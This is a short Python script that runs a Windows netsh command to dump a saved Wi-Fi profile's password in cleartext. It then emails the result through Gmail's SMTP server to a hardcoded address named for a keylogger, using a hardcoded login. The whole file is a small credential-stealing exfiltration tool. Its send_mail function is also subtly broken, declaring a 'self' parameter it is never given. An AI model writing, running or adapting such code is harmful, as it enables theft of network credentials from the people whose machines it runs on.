import subprocess, smtplib

def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email, email, message)
        server.quit()


command = "netsh wlan show profile UPC723762 key=clear"
result = subprocess.check_output(command, shell=True)
send_mail("reportkeylogger123@gmail.com", "Abc123@keylogger", result)
